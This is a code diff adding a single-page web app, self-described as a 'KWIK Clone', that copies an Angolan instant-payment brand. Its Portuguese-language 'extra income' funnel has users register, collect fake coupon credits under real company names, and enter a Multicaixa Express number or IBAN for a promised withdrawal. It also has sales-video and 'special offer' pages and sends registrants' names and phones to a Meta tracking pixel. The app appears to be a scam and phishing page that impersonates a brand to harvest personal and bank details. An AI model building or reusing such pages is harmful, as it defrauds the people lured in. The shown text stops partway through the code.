+  border-radius: 9999px;
+  background: var(--brand);
+  padding: 1rem 1.75rem 1rem 1rem;
+  color: var(--brand-foreground);
+  border: none;
+  cursor: pointer;
+  transition: transform 0.1s, filter 0.15s;
+  box-shadow: 0 6px 20px rgba(26,26,46,0.22);
+}
+
+.sucesso-btn:active { transform: scale(0.99); }
+.sucesso-btn:hover  { filter: brightness(1.12); }
+
+.sucesso-btn svg {
+  width: 1.5rem;
+  height: 1.5rem;
+}
+
+.sucesso-btn__inner {
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+}
+
+.sucesso-btn__play {
+  display: flex;
+  width: 2.25rem;
+  height: 2.25rem;
+  align-items: center;
+  justify-content: center;
+  border-radius: 9999px;
+  background: var(--brand-foreground);
+  color: var(--brand);
+}
+
+.sucesso-btn__play svg {
+  width: 1rem;
+  height: 1rem;
+  fill: var(--brand);
+  color: var(--brand);
+}
+
+.sucesso-btn__label {
+  font-family: var(--font-display);
+  font-size: 1.125rem;
+  font-weight: 900;
+}
+
+/* ===== VSL / Video Page ===== */
+.vsl-page {
+  min-height: 100vh;
+  background: var(--card);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 2.5rem 1.5rem 3rem;
+  max-width: 28rem;
+  margin: 0 auto;
+}
+
+.vsl-title {
+  width: 100%;
+  text-align: center;
+  font-family: var(--font-display);
+  font-size: 1.5rem;
+  font-weight: 900;
+  letter-spacing: -0.02em;
+  color: var(--foreground);
+}
+
+.vsl-subtitle {
+  max-width: 20rem;
+  text-align: center;
+  font-size: 0.75rem;
+  font-weight: 700;
+  line-height: 1.5;
+  color: var(--muted-foreground);
+  margin: 0.5rem auto 1.25rem;
+}
+
+.vsl-video-wrap {
+  width: 100%;
+  border-radius: 1rem;
+  overflow: hidden;
+  box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+}
+
+.vsl-cta-btn {
+  margin-top: 2rem;
+  display: flex;
+  width: 100%;
+  max-width: 22rem;
+  align-items: center;
+  justify-content: center;
+  gap: 0.75rem;
+  border-radius: 9999px;
+  background: var(--brand);
+  padding: 1rem 1.5rem;
+  font-family: var(--font-display);
+  font-size: 1.125rem;
+  font-weight: 900;
+  color: var(--brand-foreground);
+  text-decoration: none;
+  border: none;
+  cursor: pointer;
+  transition: transform 0.1s, filter 0.15s;
+  box-shadow: 0 6px 20px rgba(26,26,46,0.22);
+}
+
+.vsl-cta-btn:active { transform: scale(0.99); }
+.vsl-cta-btn:hover  { filter: brightness(1.12); }
+
+.vsl-cta-btn svg {
+  width: 1.5rem;
+  height: 1.5rem;
+}
+
+#vsl-cta {
+  display: flex;
+  width: 100%;
+  justify-content: center;
+  animation: fadeIn 0.5s ease-out;
+}
+
+/* ===== Desconto / Discount Page ===== */
+.desconto-page {
+  min-height: 100vh;
+  background: var(--card);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 2rem 1.5rem 3rem;
+  max-width: 28rem;
+  margin: 0 auto;
+}
+
+.desconto-header {
+  margin-bottom: 2rem;
+}
+
+.desconto-card {
+  width: 100%;
+  border-radius: 1.5rem;
+  background: var(--brand);
+  padding: 2rem 1.5rem;
+  text-align: center;
+  color: var(--brand-foreground);
+  box-shadow: 0 12px 32px rgba(26,26,46,0.2);
+}
+
+.desconto-icon {
+  display: flex;
+  width: 3.5rem;
+  height: 3.5rem;
+  align-items: center;
+  justify-content: center;
+  border-radius: 9999px;
+  background: rgba(255,251,230,0.15);
+  margin: 0 auto 1rem;
+}
+
+.desconto-icon svg {
+  width: 1.75rem;
+  height: 1.75rem;
+  color: var(--accent);
+}
+
+.desconto-title {
+  font-family: var(--font-display);
+  font-size: 0.8rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.2em;
+  opacity: 0.8;
+  margin-bottom: 0.5rem;
+}
+
+.desconto-amount {
+  font-family: var(--font-display);
+  font-size: 2.25rem;
+  font-weight: 900;
+  letter-spacing: -0.02em;
+  color: var(--accent);
+}
+
+.desconto-divider {
+  height: 1px;
+  width: 4rem;
+  margin: 1.25rem auto;
+  background: rgba(255,255,255,0.15);
+}
+
+.desconto-text {
+  font-size: 0.95rem;
+  font-weight: 500;
+  line-height: 1.6;
+  opacity: 0.9;
+  max-width: 20rem;
+  margin: 0 auto;
+}
+
+.desconto-text-sm {
+  font-size: 0.8rem;
+  font-weight: 400;
+  line-height: 1.5;
+  opacity: 0.65;
+  margin-top: 0.75rem;
+}
+
+.desconto-btn {
+  margin-top: 2rem;
+  display: flex;
+  width: 100%;
+  align-items: center;
+  justify-content: center;
+  gap: 0.75rem;
+  border-radius: 0.75rem;
+  background: var(--accent);
+  padding: 1rem 1.5rem;
+  font-family: var(--font-display);
+  font-size: 1.125rem;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  color: var(--brand);
+  text-decoration: none;
+  transition: transform 0.1s, filter 0.15s;
+  box-shadow: 0 4px 16px rgba(245,158,11,0.35);
+}
+
+.desconto-btn:active { transform: scale(0.99); }
+.desconto-btn:hover  { filter: brightness(1.08); }
+
+.desconto-btn svg {
+  width: 1.5rem;
+  height: 1.5rem;
+}
+
+.desconto-footer {
+  margin-top: 1.5rem;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--muted-foreground);
+  text-align: center;
+}
+
+/* ===== Bak / Oferta Especial Page ===== */
+.bak-page {
+  min-height: 100vh;
+  background: var(--card);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 2.5rem 1.5rem;
+  max-width: 28rem;
+  margin: 0 auto;
+  text-align: center;
+}
+
+.bak-heading {
+  font-family: var(--font-display);
+  font-size: 1.875rem;
+  font-weight: 900;
+  letter-spacing: -0.02em;
+  color: var(--foreground);
+  margin-bottom: 1.75rem;
+}
+
+.bak-heading__orange {
+  color: var(--accent);
+}
+
+.bak-circle {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  width: 11rem;
+  height: 11rem;
+  border-radius: 9999px;
+  border: 4px solid var(--accent);
+  background: rgba(245,158,11,0.1);
+  margin-bottom: 1.75rem;
+  animation: pulse-ring 2s ease-in-out infinite;
+}
+
+@keyframes pulse-ring {
+  0%, 100% { box-shadow: 0 0 0 0 rgba(245,158,11,0.4); }
+  50%       { box-shadow: 0 0 0 16px rgba(245,158,11,0); }
+}
+
+.bak-percent {
+  font-family: var(--font-display);
+  font-size: 3.75rem;
+  font-weight: 900;
+  line-height: 1;
+  color: var(--accent);
+  font-variant-numeric: tabular-nums;
+}
+
+.bak-percent-label {
+  margin-top: 0.5rem;
+  font-family: var(--font-display);
+  font-size: 0.6rem;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 0.28em;
+  color: var(--muted-foreground);
+}
+
+.bak-title {
+  font-size: 1.5rem;
+  font-weight: 900;
+  line-height: 1.35;
+  color: var(--foreground);
+  margin-bottom: 1.25rem;
+}
+
+.bak-orange {
+  color: var(--accent);
+}
+
+.bak-desc {
+  font-size: 1rem;
+  line-height: 1.6;
+  color: var(--muted-foreground);
+  margin-bottom: 2rem;
+  max-width: 22rem;
+}
+
+.bak-coupon-box {
+  width: 100%;
+  border-radius: 1rem;
+  border: 2px dashed var(--accent);
+  background: rgba(245,158,11,0.08);
+  padding: 1.5rem 1rem;
+  margin-bottom: 2rem;
+}
+
+.bak-coupon-label {
+  font-size: 1rem;
+  font-weight: 600;
+  color: var(--foreground);
+  margin-bottom: 0.5rem;
+}
+
+.bak-coupon-code {
+  font-family: var(--font-display);
+  font-size: 1.875rem;
+  font-weight: 900;
+  letter-spacing: 0.08em;
+  color: var(--accent);
+  margin-bottom: 0.5rem;
+  animation: pulse-ring 2s ease-in-out infinite;
+}
+
+.bak-coupon-valid {
+  font-size: 0.875rem;
+  color: var(--muted-foreground);
+}
+
+.bak-cta-btn {
+  display: flex;
+  width: 100%;
+  align-items: center;
+  justify-content: center;
+  border-radius: 9999px;
+  background: var(--accent);
+  padding: 1.25rem 1.5rem;
+  font-family: var(--font-display);
+  font-size: 1.125rem;
+  font-weight: 900;
+  line-height: 1.3;
+  text-align: center;
+  color: var(--brand);
+  text-decoration: none;
+  transition: transform 0.1s, filter 0.15s;
+  box-shadow: 0 6px 20px rgba(245,158,11,0.4);
+  letter-spacing: 0.01em;
+}
+
+.bak-cta-btn:active { transform: scale(0.99); }
+.bak-cta-btn:hover  { filter: brightness(1.08); }
+
+  </style>
+</head>
+<body>
+  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2556674554818179&amp;ev=PageView&amp;noscript=1" alt=""></noscript>
+  <div id="app">
+    <main class="page-main animate-fade-in">
+      <header class="header-curved">
+        <div class="flex items-start justify-between">
+          <button type="button" aria-label="Menu" class="menu-btn">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 5h16"/><path d="M4 12h16"/><path d="M4 19h16"/></svg>
+          </button>
+          <div class="kwik-logo">
+            <span class="kwik-logo__word kwik-logo__word--lg" aria-label="KWIK">
+              <span>KW</span><span class="kwik-logo__i">I<span class="kwik-logo__tri kwik-logo__tri--lg" aria-hidden="true"></span></span><span>K</span>
+            </span>
+            <span class="kwik-logo__sub kwik-logo__sub--lg">kwanza instantâneo</span>
+          </div>
+          <div style="width: 2.5rem;"></div>
+        </div>
+      </header>
+      <section>
+        <h1 class="heading-welcome">Bem-vindo!</h1>
+        <p class="subtitle-welcome">Que tal fazermos uma renda extra juntos?</p>
+        <div class="divider-bar"></div>
+      </section>
+      <section class="step-cards">
+        <button type="button" class="step-card step-card--active" id="btn-step-cadastro" onclick="navigate('/cadastro')">
+          <span class="step-circle step-circle--active">1</span>
+          <span class="flex-1">
+            <span class="step-title step-title--active">Cadastro</span>
+            <span class="step-desc step-desc--active">Realize seu cadastro para começar</span>
+          </span>
+          <span class="step-chevron">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg>
+          </span>
+        </button>
+        <div class="step-card step-card--disabled" aria-disabled="true">
+          <span class="step-circle step-circle--disabled">2</span>
+          <span class="flex-1">
+            <span class="step-title step-title--disabled">Encontrar KWIK</span>
+            <span class="step-desc step-desc--disabled">Localize e valide seus cupons de desconto</span>
+          </span>
+        </div>
+        <div class="step-card step-card--disabled" aria-disabled="true">
+          <span class="step-circle step-circle--disabled">3</span>
+          <span class="flex-1">
+            <span class="step-title step-title--disabled">Saque</span>
+            <span class="step-desc step-desc--disabled">Receba seu kwanza instantâneo na conta</span>
+          </span>
+        </div>
+      </section>
+    </main>
+  </div>
+  <div id="modal-overlay" class="modal-overlay hidden"></div>
+  <script>
+/* ===== KWIK Clone — Full SPA Application ===== */
+
+// ===== SVG Icons =====
+const Icons = {
+  menu: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 5h16"/><path d="M4 12h16"/><path d="M4 19h16"/></svg>`,
+  chevronRight: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m9 18 6-6-6-6"/></svg>`,
+  chevronDown: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>`,
+  arrowLeft: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>`,
+  arrowRight: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>`,
+  user: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>`,
+  shieldCheck: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>`,
+  check: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>`,
+  circleCheck: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>`,
+  partyPopper: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5.8 11.3 2 22l10.7-3.79"/><path d="M4 3h.01"/><path d="M22 8h.01"/><path d="M15 2h.01"/><path d="M22 20h.01"/><path d="m22 2-2.24.75a2.9 2.9 0 0 0-1.96 3.12c.1.86-.57 1.63-1.45 1.63h-.38c-.86 0-1.6.6-1.76 1.44L14 10"/><path d="m22 13-.82-.33c-.86-.34-1.82.2-1.98 1.11c-.11.7-.72 1.22-1.43 1.22H17"/><path d="m11 2 .33.82c.34.86-.2 1.82-1.11 1.98C9.52 4.9 9 5.52 9 6.23V7"/><path d="M11 13c1.93 1.93 2.83 4.17 2 5-.83.83-3.07-.07-5-2-1.93-1.93-2.83-4.17-2-5 .83-.83 3.07.07 5 2Z"/></svg>`,
+  x: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>`,
+  landmark: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 18v-7"/><path d="M11.12 2.198a2 2 0 0 1 1.76.006l7.866 3.847c.476.233.31.949-.22.949H3.474c-.53 0-.695-.716-.22-.949z"/><path d="M14 18v-7"/><path d="M18 18v-7"/><path d="M3 22h18"/><path d="M6 18v-7"/></svg>`,
+  smartphone: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>`,
+  play: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z"/></svg>`,
+};
+
+// ===== State Store =====
+const store = {
+  registered: false,
+  name: '',
+  phone: '',
+  balance: 0,
+  couponStep: 0,
+  lastWithdrawal: null,
+  withdrawalDetails: null,
+  history: [],
+};
+
+// ===== Coupon Data — with images =====
+const COUPONS = [
+  { step: 1, brand: 'UNITEL', code: '38154927', value: 3000, image: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Image%202026-10-28%20at%2002.00.29-NobwC7hD4GeYuw7FYnIYrTM3iXeNIs.jpeg' },
+  { step: 2, brand: 'KWIK', code: '62849317', value: 5000, image: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Image%202026-10-28%20at%2002.00.29%20%281%29-tRPJdiWdg2yFrHn5O2QAcmxKrhhX8g.jpeg' },
+  { step: 3, brand: 'BANTUBET', code: '73528164', value: 7000, image: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Image%202026-10-28%20at%2002.00.29%20%282%29-NThD87gfv0AyVKsCNpCXHx4mLp7bsd.jpeg' },
+  { step: 4, brand: 'CUCA', code: '16482753', value: 9000, image: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Image%202026-10-28%20at%2002.00.30-uHU4NpAkghyIM6AMzyfNjZXBH4wJVh.jpeg' },
+  { step: 5, brand: 'PAY', code: '95318472', value: 11000, image: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Image%202026-10-28%20at%2002.00.31-jjSKyJCSj0YoCjWv12AiWfHlpr1fnm.jpeg' },
+  { step: 6, brand: 'ZAP', code: '27594386', value: 13000, image: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Image%202026-10-28%20at%2002.00.31%20%281%29-p5XAv0WU6tTFqZw41Dsy2DZV214BvA.jpeg' },
+  { step: 7, brand: 'EMIS', code: '84261935', value: 15000, image: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Image%202026-10-28%20at%2002.00.32-LxxmIR61LAptTplmVSmy228kJzC3IJ.jpeg' },
+  { step: 8, brand: 'KERO', code: '31864572', value: 17000, image: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Image%202026-10-28%20at%2002.00.32%20%281%29-xysjtDbYcECLAGovVZDQth3DGVgvcJ.jpeg' },
+  { step: 9, brand: 'SONANGOL', code: '48372615', value: 20000, image: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Image%202026-10-28%20at%2002.00.33-7h6pf0SkH7csQCeaBTNxGpvCeMnubJ.jpeg' },
+  { step: 10, brand: 'AFRICELL', code: '57291846', value: 25000, image: 'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Image%202026-10-28%20at%2002.00.33%20%281%29-xwjgr0eVEFE3Izr9hiGtuMe8favf7M.jpeg' },
+];
+
+const TOTAL_VALUE = COUPONS.reduce((s, c) => s + c.value, 0);
+
+// ===== Utilities =====
+function formatKz(value) {
+  const fixed = value.toFixed(2);
+  const dotIndex = fixed.lastIndexOf('.');
+  const intPart = fixed.slice(0, dotIndex);
+  const decPart = fixed.slice(dotIndex + 1);
+  return `Kz ${intPart.replace(/\B(?=(\d{3})+(?!\d))/g, '.')},${decPart}`;
+}
+
+function kwikLogo(size = 'md') {
+  return `
+    <div class="kwik-logo">
+      <span class="kwik-logo__word kwik-logo__word--${size}" aria-label="KWIK">
+        <span>KW</span><span class="kwik-logo__i">I<span class="kwik-logo__tri kwik-logo__tri--${size}" aria-hidden="true"></span></span><span>K</span>
+      </span>
+      <span class="kwik-logo__sub kwik-logo__sub--${size}">kwanza instantâneo</span>
+    </div>
+  `;
+}
+
+function headerBar() {
+  return `
+    <header class="header-bar">
+      ${kwikLogo('sm')}
+      <div class="balance-badge">
+        <div class="balance-badge__label">Saldo</div>
+        <div class="balance-badge__value">${formatKz(store.balance)}</div>
+      </div>
+    </header>
+  `;
+}
+
+// ===== Router =====
+function navigate(path) {
+  const cleanPath = path.startsWith('/') ? path : '/' + path;
+  if (window.location.hash === '#' + cleanPath || (cleanPath === '/' && !window.location.hash)) {
+    renderPage(true);
+  } else {
+    window.location.hash = cleanPath;
+  }
+}
+
+function getCurrentRoute() {
+  const hash = window.location.hash.slice(1) || '/';
+  return hash;
+}
+
+// ===== Pages =====
+
+// --- Homepage ---
+function renderHome() {
+  return `
+    <main class="page-main animate-fade-in">
+      <header class="header-curved">
+        <div class="flex items-start justify-between">
+          <button type="button" aria-label="Menu" class="menu-btn">
+            ${Icons.menu}
+          </button>
+          ${kwikLogo('lg')}
+          <div style="width: 2.5rem;"></div>
+        </div>
+      </header>
+      <section>
+        <h1 class="heading-welcome">Bem-vindo!</h1>
+        <p class="subtitle-welcome">Que tal fazermos uma renda extra juntos?</p>
+        <div class="divider-bar"></div>
+      </section>
+      <section class="step-cards">
+        <button type="button" class="step-card step-card--active" id="btn-step-cadastro">
+          <span class="step-circle step-circle--active">1</span>
+          <span class="flex-1">
+            <span class="step-title step-title--active">Cadastro</span>
+            <span class="step-desc step-desc--active">Realize seu cadastro para começar</span>
+          </span>
+          <span class="step-chevron">${Icons.chevronRight}</span>
+        </button>
+        <div class="step-card step-card--disabled" aria-disabled="true">
+          <span class="step-circle step-circle--disabled">2</span>
+          <span class="flex-1">
+            <span class="step-title step-title--disabled">Encontrar KWIK</span>
+            <span class="step-desc step-desc--disabled">Localize e valide seus cupons de desconto</span>
+          </span>
+        </div>
+        <div class="step-card step-card--disabled" aria-disabled="true">
+          <span class="step-circle step-circle--disabled">3</span>
+          <span class="flex-1">
+            <span class="step-title step-title--disabled">Saque</span>
+            <span class="step-desc step-desc--disabled">Receba seu kwanza instantâneo na conta</span>
+          </span>
+        </div>
+      </section>
+    </main>
+  `;
+}
+
+function bindHome() {
+  document.getElementById('btn-step-cadastro')?.addEventListener('click', () => {
+    window.MetaTracker?.trackCustom('StartFunnel', { step: 'cadastro' });
+    navigate('/cadastro');
+  });
+}
+
+
+// --- Cadastro ---
+function renderCadastro() {
+  const steps = ['Dados', 'Verificação', 'Segurança', 'Concluir'];
+  return `
+    <main class="page-main page-padded animate-fade-in">
+      <div class="relative flex items-center justify-center">
+        <button type="button" aria-label="Voltar" class="back-btn" id="btn-back-cadastro">
+          ${Icons.arrowLeft}
+        </button>
+        ${kwikLogo('md')}
+      </div>
+      <ol class="stepper">
+        ${steps.map((label, i) => `
+          <li class="stepper__item">
+            <div class="stepper__track">
+              <span class="stepper__line ${i === 0 ? 'stepper__line--transparent' : 'stepper__line--border'}"></span>
+              <span class="stepper__dot ${i === 0 ? 'stepper__dot--active' : 'stepper__dot--inactive'}">${i + 1}</span>
+              <span class="stepper__line ${i === steps.length - 1 ? 'stepper__line--transparent' : 'stepper__line--border'}"></span>
+            </div>
+            <span class="stepper__label ${i === 0 ? 'stepper__label--active' : 'stepper__label--inactive'}">${label}</span>
+          </li>
+        `).join('')}
+      </ol>
+      <h1 class="heading-page mt-8">Crie sua conta</h1>
+      <p class="subtitle-page">É rápido, fácil e seguro.</p>
+      <div class="divider-bar"></div>
+      <form id="cadastro-form" class="mt-8 space-y-6">
+        <div>
+          <label for="nome" class="form-label">Nome completo</label>
+          <div class="form-input-wrap">
+            ${Icons.user}
+            <input id="nome" required placeholder="Seu nome completo" class="form-input" value="" />
+          </div>
+        </div>
+        <div>
+          <label for="telefone" class="form-label">Telefone</label>
+          <div class="phone-wrap">
+            <div class="phone-prefix">
+              <span class="phone-prefix__flag" aria-hidden="true">🇦🇴</span>
+              <span class="phone-prefix__code" id="phone-code-display">+244</span>
+              <span class="phone-prefix__chevron">${Icons.chevronDown}</span>
+              <select aria-label="Código do país" id="phone-country">
+                <option value="+244" selected>Angola +244</option>
+                <option value="+238">Cabo Verde +238</option>
+                <option value="+258">Moçambique +258</option>
+                <option value="+351">Portugal +351</option>
+                <option value="+55">Brasil +55</option>
+              </select>
+            </div>
+            <input id="telefone" required inputmode="numeric" placeholder="900 000 000" class="phone-input" value="" />
+          </div>
+        </div>
+        <div id="cadastro-error" class="error-msg hidden"></div>
+        <div class="security-notice">
+          ${Icons.shieldCheck}
+          <div>
+            <p class="security-notice__title">Seus dados estão protegidos</p>
+            <p class="security-notice__desc">Não compartilhamos suas informações com terceiros.</p>
+          </div>
+        </div>
+        <button type="submit" class="btn-primary">Criar conta</button>
+      </form>
+    </main>
+  `;
+}
+
+function bindCadastro() {
+  document.getElementById('btn-back-cadastro')?.addEventListener('click', () => navigate('/'));
+
+  const countrySelect = document.getElementById('phone-country');
+  const codeDisplay = document.getElementById('phone-code-display');
+  countrySelect?.addEventListener('change', () => {
+    codeDisplay.textContent = countrySelect.value;
+  });
+
+  const phoneInput = document.getElementById('telefone');
+  phoneInput?.addEventListener('input', () => {
+    phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 9);
+  });
+
+  document.getElementById('cadastro-form')?.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const nome = document.getElementById('nome').value.trim();
+    const telefone = document.getElementById('telefone').value.trim();
+    const errorEl = document.getElementById('cadastro-error');
+
+    if (!nome || !telefone) {
+      errorEl.textContent = 'Preencha seu nome e telefone.';
+      errorEl.classList.remove('hidden');
+      return;
+    }
+
+    errorEl.classList.add('hidden');
+    const code = document.getElementById('phone-country').value;
+    store.registered = true;
+    store.name = nome;
+    store.phone = `${code} ${telefone}`;
+
+    if (window.MetaTracker) {
+      window.MetaTracker.setUserData({
+        name: nome,
+        phone: telefone,
+        countryCode: code,
+      });
+      window.MetaTracker.track('CompleteRegistration', {
+        content_name: 'Cadastro KWIK',
+        status: true,
+      });
+      window.MetaTracker.track('Lead', {
+        content_name: 'Lead KWIK',
+        content_category: 'cadastro',
+      });
+    }
+
+    showCadastroSuccess();
+  });
+}
+
+function showCadastroSuccess() {
+  const overlay = document.getElementById('modal-overlay');
+  overlay.innerHTML = `
+    <div class="modal-card">
+      <div class="modal-icon modal-icon--success">
+        ${Icons.check}
+      </div>
+      <h2 class="modal-title">CONTA CRIADA</h2>
+      <p class="modal-text">Parabéns! Sua conta foi criada com sucesso!</p>
+      <p class="modal-text-sm">Seja muito bem-vindo à KWIK.</p>
+      <p class="modal-text-sm">Você já está dentro da nossa 1ª Campanha de Cupons de Desconto. 🚀</p>
+      <p class="modal-text-orange">Seu próximo passo: encontrar seu primeiro KWIK!</p>
+      <div class="modal-progress-track">
+        <div class="modal-progress-bar"></div>
+      </div>
+    </div>
+  `;
+  overlay.classList.remove('hidden');
+
+  setTimeout(() => {
+    overlay.classList.add('hidden');
+    overlay.innerHTML = '';
+    navigate('/saque');
+  }, 6000);
+}
+
+// --- Saque (Withdrawal Method) ---
+function renderSaque() {
+  return `
+    <div class="page-main animate-fade-in">
+      ${headerBar()}
+      <main class="page-padded">
+        <button class="btn-ghost" id="btn-back-saque" type="button">
+          ${Icons.arrowLeft} Voltar
+        </button>
+        <h1 class="heading-page mt-4">Método de retirada</h1>
+        <div class="divider-bar"></div>
+        <form id="saque-form" class="mt-6 space-y-5">
+          <div class="grid grid-cols-2 gap-3">
+            <button type="button" class="method-btn method-btn--active" id="method-express" aria-pressed="true">
+              <span style="font-size:1.5rem;">📱</span>
+              Multicaixa Express
+            </button>
+            <button type="button" class="method-btn method-btn--inactive" id="method-iban" aria-pressed="false">
+              ${Icons.landmark}
+              IBAN
+            </button>
+          </div>
+          <div>
+            <label for="titular" class="form-label">Nome do titular</label>
+            <div class="form-input-wrap">
+              ${Icons.user}
+              <input id="titular" placeholder="Nome completo" class="form-input" value="${store.name || ''}" />
+            </div>
+          </div>
+          <div id="account-field">
+            <label for="conta" class="form-label" id="conta-label">Número Multicaixa Express</label>
+            <div class="form-input-wrap">
+              ${Icons.smartphone}
+              <input id="conta" inputmode="numeric" placeholder="900 000 000" class="form-input" value="" />
+            </div>
+          </div>
+          <div id="saque-error" class="error-msg hidden"></div>
+          <button type="submit" class="btn-primary">Continuar</button>
+        </form>
+      </main>
+    </div>
+  `;
+}
+
+function bindSaque() {
+  let method = 'express';
+
+  document.getElementById('btn-back-saque')?.addEventListener('click', () => navigate('/'));
+
+  const expressBtn = document.getElementById('method-express');
+  const ibanBtn = document.getElementById('method-iban');
+  const contaLabel = document.getElementById('conta-label');
+  const contaInput = document.getElementById('conta');
+
+  expressBtn?.addEventListener('click', () => {
+    method = 'express';
+    expressBtn.className = 'method-btn method-btn--active';
+    expressBtn.setAttribute('aria-pressed', 'true');
+    ibanBtn.className = 'method-btn method-btn--inactive';
+    ibanBtn.setAttribute('aria-pressed', 'false');
+    contaLabel.textContent = 'Número Multicaixa Express';
+    contaInput.placeholder = '900 000 000';
+    contaInput.value = '';
+  });
+
+  ibanBtn?.addEventListener('click', () => {
+    method = 'iban';
+    ibanBtn.className = 'method-btn method-btn--active';
+    ibanBtn.setAttribute('aria-pressed', 'true');
+    expressBtn.className = 'method-btn method-btn--inactive';
+    expressBtn.setAttribute('aria-pressed', 'false');
+    contaLabel.textContent = 'IBAN (após AO06)';
+    contaInput.placeholder = '000000000000000000000';
+    contaInput.value = '';
+  });
+
+  contaInput?.addEventListener('input', () => {
+    const max = method === 'express' ? 9 : 21;
+    contaInput.value = contaInput.value.replace(/\D/g, '').slice(0, max);
+  });
+
+  document.getElementById('saque-form')?.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const holder = document.getElementById('titular').value.trim();
+    const account = contaInput.value.trim();
+    const errorEl = document.getElementById('saque-error');
+
+    if (!holder) {
+      errorEl.textContent = 'Indique o nome do titular.';
+      errorEl.classList.remove('hidden');
+      return;
+    }
+
+    if (method === 'express' && !/^\d{9}$/.test(account)) {
+      errorEl.textContent = 'Indique um número Multicaixa Express válido (9 dígitos).';
+      errorEl.classList.remove('hidden');
+      return;
+    }
+
+    if (method === 'iban' && !/^\d{21}$/.test(account)) {
